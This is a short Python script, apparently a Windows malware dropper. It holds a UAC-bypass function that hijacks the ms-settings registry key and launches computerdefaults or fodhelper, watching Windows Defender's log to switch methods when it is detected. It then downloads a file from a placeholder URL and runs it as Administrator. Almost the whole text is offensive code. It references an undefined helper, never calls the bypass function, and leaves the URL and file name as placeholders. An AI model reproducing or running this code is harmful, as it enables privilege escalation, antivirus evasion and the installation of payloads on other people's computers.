from os import sys
import os
import subprocess
import requests


def UACbypass(method: int = 1) -> bool:
        if GetSelf()[1]:
            execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
            match method:
                case 1:
                    execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
                    execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute("computerdefaults --nouacbypass")
                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
                    if log_count_after > log_count_before:
                        return UACbypass(method + 1)
                case 2:
                    execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
                    execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute("fodhelper --nouacbypass")
                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
                    if log_count_after > log_count_before:
                        return UACbypass(method + 1)
                case _:
                    return False
            return True

url = "pontulinkaki"
response = requests.get(url)
filename = "elnombredelarchivoaqui"
with open(filename, 'wb') as f:
    f.write(response.content)
os.system(f'runas /user:Administrator {filename}')
